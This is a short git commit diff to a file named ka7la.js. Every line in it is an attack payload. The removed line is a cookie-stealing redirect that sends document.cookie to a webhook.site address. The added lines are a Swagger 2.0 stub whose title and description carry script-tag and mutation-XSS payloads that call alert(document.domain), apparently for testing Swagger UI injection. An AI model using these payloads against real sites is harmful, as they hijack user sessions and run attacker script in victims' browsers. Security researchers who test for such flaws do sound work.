4338a650bde0698317f22e12d4b096a0c0300b2f
louay khammassi <98761307+loudath@users.noreply.github.com>
2024-08-08 16:38:28 +0100

    Update ka7la.js

--- ka7la.js
+++ ka7la.js
@@ -1,1 +1,5 @@
-document.location='https://webhook.site/2d0c7bc5-eb22-4ceb-ab6b-a3ff98b723e3?c='+document.cookie
+swagger: '2.0'
+info:
+  title: <script> alert(document.domain)</script>
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script> alert(document.domain)</script>"></form>
